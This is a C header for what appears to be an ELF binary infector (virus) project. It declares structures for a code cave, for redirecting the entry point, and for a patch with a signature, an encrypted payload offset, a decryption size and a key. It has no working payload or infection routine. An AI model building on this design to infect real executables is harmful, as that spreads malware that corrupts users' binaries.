#ifndef DATA_H
# define DATA_H

# include <elf.h>
# include <sys/types.h>
# include <stdbool.h>
# include <linux/limits.h>

#define MAGIC_NUMBER 0x15D2F

#define DT_REG 8
#define DT_DIR 4

typedef struct s_fileview {
	uint8_t *data;
	size_t size;
} t_fileview;

typedef struct dirent_s {
	__ino_t d_ino;
	__off_t d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[256];
} dirent_t;

typedef struct s_elf {
	Elf64_Ehdr	*ehdr;
	Elf64_Shdr	*shdr;
	Elf64_Phdr	*phdr;

	size_t		size;
	mode_t		mode;

} t_elf;

typedef struct s_cave {
	Elf64_Addr	addr;
	Elf64_Addr	offset;
	/* size of the payload */
	size_t		p_size;

	Elf64_Addr	old_entry;
	int32_t		rel_jmp;
} t_cave;

typedef struct s_packer {
	Elf64_Addr	addr;
	Elf64_Addr	offset;
	size_t		p_size;

	Elf64_Addr	old_entry;
	int32_t		rel_jmp;
} t_packer;

#define SIGNATURE_SIZE 59
#define PAYLOAD 0x0
#define PACKER 0x1

typedef struct __attribute__((packed)) patch {
	int32_t		jmp;
	char		signature[SIGNATURE_SIZE];
	//uint32_t	signature_key;
	uint64_t	mprotect_size;
	uint64_t	decrypt_size;
	uint64_t	virus_offset;
	int64_t		key;
} t_patch;

/* 4 + 38 + 8 + 8 + 8 + 8 = 74 */

typedef struct s_data {
	uint8_t		*file;
	size_t		size;

	//Elf64_Off	data_offset;
	//size_t		data_page_size;

	t_elf		elf;
	t_cave		cave;
	t_packer	packer;
	t_patch		patch;

	//int64_t		key;
	//char		*signature;
	char		target_name[PATH_MAX];
	char		self_name[PATH_MAX];
} t_data;

void	free_data(t_data *data);
int		updade_hdr(t_data *data);

#endif
